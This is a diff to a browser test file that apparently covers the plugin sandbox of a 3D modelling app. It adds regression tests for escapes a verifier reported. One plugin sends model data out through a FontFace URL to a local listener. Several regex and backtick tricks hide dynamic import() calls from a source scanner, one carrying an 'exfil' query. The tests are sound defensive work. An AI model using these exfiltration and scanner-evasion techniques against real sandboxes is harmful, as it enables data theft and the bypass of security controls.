@@ -1,5 +1,26 @@
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import { expect, test, type Page } from "@playwright/test";
 import { box, ready, solids } from "./helpers";
+
+/** A listener on a free loopback port that records every request's path: where a leak would land. */
+async function listener(): Promise<{ url: string; hits: string[]; close(): Promise<void> }> {
+  const hits: string[] = [];
+  const server = createServer((req, res) => {
+    hits.push(req.url ?? "");
+    res.writeHead(404, { "access-control-allow-origin": "*" });
+    res.end();
+  });
+  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
+  const { port } = server.address() as AddressInfo;
+  return { url: `http://127.0.0.1:${port}`, hits, close: () => new Promise<void>((resolve) => server.close(() => resolve())) };
+}
+
+/** Prove the listener is reachable from the page (connect-src allows loopback), so "no hits" means something. */
+async function control(page: Page, l: { url: string; hits: string[] }) {
+  await page.evaluate((u) => fetch(`${u}/control`, { mode: "no-cors" }).catch(() => undefined), l.url);
+  await expect.poll(() => l.hits, { timeout: 5_000 }).toContain("/control");
+}
 
 // The plugin sandbox (lane 11), proved in a real browser with real Web Workers: a plugin
 // gets only what its manifest asks for, enforced by the app; it has no DOM, no network
@@ -55,6 +76,10 @@ report("globals", {
   WebSocket: typeof WebSocket, EventSource: typeof EventSource, indexedDB: typeof indexedDB, caches: typeof caches,
   scripts: typeof self["import" + "Scripts"], Worker: typeof Worker, BroadcastChannel: typeof BroadcastChannel,
   postMessage: typeof postMessage, storage: typeof navigator.storage,
+  FontFace: typeof FontFace, fonts: typeof self.fonts, fsSync: typeof webkitRequestFileSystemSync,
+  fs: typeof webkitRequestFileSystem, buckets: typeof navigator.storageBuckets, locks: typeof navigator.locks,
+  objectURL: typeof URL.createObjectURL, MessageChannel: typeof MessageChannel, scheme: self.location.protocol,
+  textEncoder: typeof TextEncoder, response: typeof Response, offscreen: typeof OffscreenCanvas,
 });
 await attempt("eval", () => eval("1 + 1"));
 await attempt("Function", () => new Function("return 1")());
@@ -94,6 +119,22 @@ test("a plugin without model.write cannot change the model; without net it has n
     BroadcastChannel: "undefined",
     postMessage: "undefined",
     storage: "undefined",
+    // The verifier's escapes (FontFace(...).load() reached any URL; the sandboxed file system
+    // was a covert store) and their cousins: gone with the allowlist.
+    FontFace: "undefined",
+    fonts: "undefined",
+    fsSync: "undefined",
+    fs: "undefined",
+    buckets: "undefined",
+    locks: "undefined",
+    objectURL: "undefined",
+    MessageChannel: "undefined",
+    // Started from a blob: URL, so the page's content security policy governs it.
+    scheme: "blob:",
+    // What a plugin computes with is still there.
+    textEncoder: "function",
+    response: "function",
+    offscreen: "function",
   });
   for (const k of ["eval", "Function", "ctor", "asyncCtor"]) {
     const r = JSON.parse(await logged(page, id, `${k}=`));
@@ -122,11 +163,21 @@ test("code that would load from outside is refused before it runs", async ({ pag
   const remote = await load(page, plugin("org.example.remote", [], 'import x from "https://example.com/x.js";'), false);
   const blob = await load(page, plugin("org.example.sneaky", [], 'import/* hi */("data:text/javascript,1");'), false);
   const scripts = await load(page, plugin("org.example.scripts", [], 'importScripts("https://example.com/x.js");'), false);
+  // The verifier's bypasses of the old text scanner: a regex with a quote or a backtick where
+  // it guessed "division" hid the import() after it. The parser is not fooled.
+  const regex = await load(page, plugin("org.example.regex", [], 'if (true) /"/.test("x"); import("data:text/javascript,export default 1");'), false);
+  const thrown = await load(page, plugin("org.example.thrown", [], 'try { throw /"/; } catch {}\nimport("data:text/javascript,1");'), false);
+  const tick = await load(page, plugin("org.example.tick", [], 'if (1) /`/.test(""); import("http://localhost:5212/@vite/env.js?exfil=1");'), false);
+  const dflt = await load(page, plugin("org.example.dflt", [], 'export default /"/;\nimport("data:text/javascript,1");'), false);
   for (const [id, want] of [
     [dynamic, "dynamic import() is not allowed"],
     [remote, 'may import only "sawhorse"'],
     [blob, "dynamic import() is not allowed"],
     [scripts, "importScripts is not available"],
+    [regex, "main.js:1: dynamic import() is not allowed"],
+    [thrown, "main.js:2: dynamic import() is not allowed"],
+    [tick, "main.js:1: dynamic import() is not allowed"],
+    [dflt, "main.js:2: dynamic import() is not allowed"],
   ]) {
     const e = await entry(page, id);
     expect(e.status).toBe("invalid");
@@ -173,4 +224,66 @@ test("a plugin that throws while loading did not start, and says why", async ({ 
   const id = await load(page, plugin("org.example.thrower", [], 'throw new Error("no thanks");'));
   await expect.poll(async () => (await entry(page, id)).status).toBe("failed");
   expect((await entry(page, id)).lastError).toContain("no thanks");
+});
+
+test("a plugin without net cannot send the model out with a font load (the verifier's escape)", async ({ page }) => {
+  const l = await listener();
+  try {
+    await ready(page);
+    await box(page);
+    // The verifier's plugin, verbatim apart from the address: before the fix the request
+    // carried the model's label, volume and bounds.
+    const id = await load(
+      page,
+      plugin(
+        "org.example.fontleak",
+        ["model.read"],
+        `import { model } from "sawhorse";
+const s = await model.solids();
+await new FontFace("x", "url(${l.url}/?leak=" + encodeURIComponent(JSON.stringify(s)) + ")").load().catch(() => {});
+console.log("sent");`,
+      ),
+    );
+    await expect.poll(async () => (await entry(page, id)).status, { timeout: 10_000 }).toBe("failed");
+    expect((await entry(page, id)).lastError).toContain("FontFace is not defined");
+    await control(page, l);
+    expect(l.hits.filter((h) => h.includes("leak"))).toEqual([]);
+  } finally {
+    await l.close();
+  }
+});
+
+test("the second lock: a worker started from a blob: URL, as every plugin's is, runs under the page's policy", async ({ page }) => {
+  const l = await listener();
+  try {
+    await ready(page);
+    const csp = (await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content")) ?? "";
+    expect(csp).toContain("script-src 'self' 'wasm-unsafe-eval' blob:");
+    expect(csp).toContain("font-src 'self' data:");
+    // A worker without the lockdown, made the way host.ts makes a plugin's: what would get out
+    // if a plugin ever got past the allowlist and the source check?
+    const out = await page.evaluate(async (u) => {
+      const code = `const out = {};
+try { await new FontFace("x", "url(${u}/font)").load(); out.font = "loaded"; } catch (e) { out.font = "refused"; }
+try { await import("${u}/module.js"); out.module = "loaded"; } catch (e) { out.module = "refused"; }
+try { await import("data:text/javascript,export default 1"); out.data = "loaded"; } catch (e) { out.data = "refused"; }
+try { await import(URL.createObjectURL(new Blob(["export default 1"], { type: "text/javascript" }))); out.blob = "loaded"; } catch (e) { out.blob = "refused"; }
+postMessage(out);`;
+      const w = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })), { type: "module" });
+      const r = await new Promise((resolve) => {
+        w.onmessage = (e) => resolve(e.data);
+        w.onerror = (e) => resolve({ error: e.message });
+      });
+      w.terminate();
+      return r;
+    }, l.url);
+    // Outside fonts and scripts and data: modules are refused before any request is made;
+    // a blob: module is allowed by the policy (that is how plugin modules are linked), which is
+    // why the lockdown takes URL.createObjectURL away and the source check refuses import().
+    expect(out).toEqual({ font: "refused", module: "refused", data: "refused", blob: "loaded" });
+    await control(page, l);
+    expect(l.hits.filter((h) => h !== "/control")).toEqual([]);
+  } finally {
+    await l.close();
+  }
 });
